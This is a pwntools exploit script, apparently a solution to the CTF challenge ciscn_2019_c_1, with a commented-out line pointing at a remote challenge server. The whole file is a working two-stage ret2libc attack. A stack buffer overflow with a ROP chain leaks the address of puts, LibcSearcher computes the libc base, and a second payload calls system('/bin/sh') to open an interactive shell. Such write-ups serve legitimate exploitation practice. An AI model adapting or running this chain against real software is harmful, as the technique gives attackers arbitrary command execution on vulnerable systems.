from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'amd64'
p=process('./ciscn_2019_c_1')
#p=remote('node4.buuoj.cn',25488)
elf=ELF('./ciscn_2019_c_1')
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
start_addr=elf.symbols["_start"]
pop_rdi_addr=0x400c83
p.recvuntil("Input your choice!\n")
p.sendline("1")
p.recvuntil("Input your Plaintext to be encrypted\n")
payload1="A"*88+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)
p.sendline(payload1)
#gdb.attach(p,'b  main')
p.recvuntil("Ciphertext\n")
p.recvuntil("\n")
puts_addr=u64(p.recv(6).ljust(8,'\x00'))
p.info('puts_addr==>%#x',puts_addr)
libc=LibcSearcher("puts",puts_addr)
libcbase=puts_addr-libc.dump("puts")
print libcbase
#gdb.attach(p,'b  main')
system_addr=libcbase+libc.dump("system")
binsh_addr=libcbase+libc.dump("str_bin_sh")
p.recvuntil("Input your choice!\n")
p.sendline("1")
p.recvuntil("Input your Plaintext to be encrypted\n")
ret_addr=0x4006b9
payload2="A"*88+p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)
p.sendline(payload2)
p.interactive()

